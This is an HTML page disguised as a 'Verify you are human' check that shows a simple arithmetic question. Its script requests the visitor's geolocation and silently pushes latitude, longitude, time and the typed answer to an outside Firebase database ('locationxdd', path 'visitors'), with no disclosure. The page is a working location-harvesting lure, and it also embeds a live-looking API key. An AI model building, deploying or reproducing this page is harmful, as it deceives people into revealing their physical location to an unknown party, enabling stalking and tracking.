<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verification</title>

<!-- Preconnect for faster Firebase loading -->
<link rel="preconnect" href="https://www.gstatic.com">
<link rel="dns-prefetch" href="https://www.gstatic.com">

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
  background:#0f172a;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  color:#fff;
}
.card{
  background:#1E1E2E;
  padding:20px;
  border-radius:14px;
  width:100%;
  max-width:320px;
  text-align:center;
}
input{
  width:100%;
  padding:10px;
  border:0;
  border-radius:8px;
  margin-top:10px;
  outline:none;
}
button{
  margin-top:12px;
  width:100%;
  padding:10px;
  border:0;
  border-radius:10px;
  background:#3b82f6;
  color:#fff;
  cursor:pointer;
  font-weight:600;
}
.status{
  margin-top:10px;
  font-size:14px;
  opacity:.9;
}
</style>
</head>
<body>

<div class="card">
  <h2>Verify you are human</h2>
  <p id="question"></p>
  <input id="answer" placeholder="Answer">
  <button id="btn">Continue</button>
  <div class="status" id="status"></div>
</div>

<script>
const questions=[
  "6+7=?",
  "8+3=?",
  "9-4=?",
  "2+7=?",
  "13-5=?"
];

const q=document.getElementById("question");
const a=document.getElementById("answer");
const s=document.getElementById("status");
const btn=document.getElementById("btn");

q.textContent=questions[Math.floor(Math.random()*questions.length)];

btn.onclick=verify;

async function verify(){
  s.textContent="Verifying...";
  btn.disabled=true;

  if(!navigator.geolocation){
    s.textContent="Geolocation not supported.";
    btn.disabled=false;
    return;
  }

  navigator.geolocation.getCurrentPosition(async pos=>{
    try{
      // Load Firebase only when needed
      const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
      const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");

      const firebaseConfig={
        apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
        authDomain:"locationxdd.firebaseapp.com",
        databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId:"locationxdd",
        storageBucket:"locationxdd.firebasestorage.app",
        messagingSenderId:"114480292043",
        appId:"1:114480292043:web:d143429c68784b0706bb4e"
      };

      const app=initializeApp(firebaseConfig);
      const db=getDatabase(app);

      await push(ref(db,"visitors"),{
        answer:a.value,
        time: Date.now(),
        lat:pos.coords.latitude,
        lng:pos.coords.longitude
      });

      s.textContent="Verification complete.";

    }catch(e){
      console.error(e);
      s.textContent="Error. Try again.";
      btn.disabled=false;
    }

  },()=>{
    s.textContent="Verification failed. Please try again.";
    btn.disabled=false;
  },{
    enableHighAccuracy:false,
    timeout:7000,
    maximumAge:60000
  });
}
</script>

</body>
</html>
